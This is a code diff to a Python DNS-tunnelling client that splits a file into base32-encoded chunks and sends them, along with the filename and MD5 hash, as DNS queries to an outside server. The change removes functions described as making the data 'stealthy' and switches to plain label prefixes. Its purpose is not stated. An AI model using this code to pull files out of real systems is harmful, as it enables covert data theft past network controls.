@@ -15,18 +15,6 @@ def calculate_md5(file_path):
             md5_hash.update(byte_block)
     return md5_hash.hexdigest()
 
-# Function to ensure base32 strings are properly padded
-def add_padding(base32_str):
-    """Ensures that base32 strings have the correct padding."""
-    missing_padding = len(base32_str) % 8
-    if missing_padding != 0:
-        return base32_str + '=' * (8 - missing_padding)
-    return base32_str
-
-# Function to make strings stealthy using base32 encoding
-def obfuscate_data(data):
-    return base64.b32encode(data.encode()).decode().strip("=")
-
 # Function to send a DNS query
 def send_dns_query(data, server_ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -43,27 +31,27 @@ def send_file_chunks(file_path, server_ip, domain):
             chunk_data = file.read(chunk_size)
             encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")
 
-            # Send the chunk with an obfuscated identifier
-            query = f"{encoded_chunk_data}.{obfuscate_data('chunk')}.{chunk_number}.{domain}"
+            # Use a static "chunk" prefix for all chunk queries
+            query = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
             print(f"Sending chunk {chunk_number}")
             send_dns_query(query, server_ip)
 
 # Function to send file information (filename and MD5 hash)
 def send_file_info(file_name, file_md5, server_ip, domain):
-    # Obfuscate the file name and MD5 hash
+    # Use static "fileinfo" prefix for the file info query
     encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
     encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
 
-    # Send the obfuscated file info as a DNS query
-    query = f"{encoded_file_name}.{encoded_file_md5}.{obfuscate_data('fileinfo')}.{domain}"
+    query = f"f.{encoded_file_name}.{encoded_file_md5}.{domain}"
     print(f"Sending file info: {file_name}, MD5: {file_md5}")
     send_dns_query(query, server_ip)
 
 # Function to signal end of transmission
 def send_end_signal(server_ip, domain):
-    end_signal = obfuscate_data("zzz") + f".{domain}"
+    # Use static "end" prefix for the end-of-transmission signal
+    query = f"e.end.{domain}"
     print("Sending end of transmission signal")
-    send_dns_query(end_signal, server_ip)
+    send_dns_query(query, server_ip)
 
 # Main client function
 def send_file(file_path):
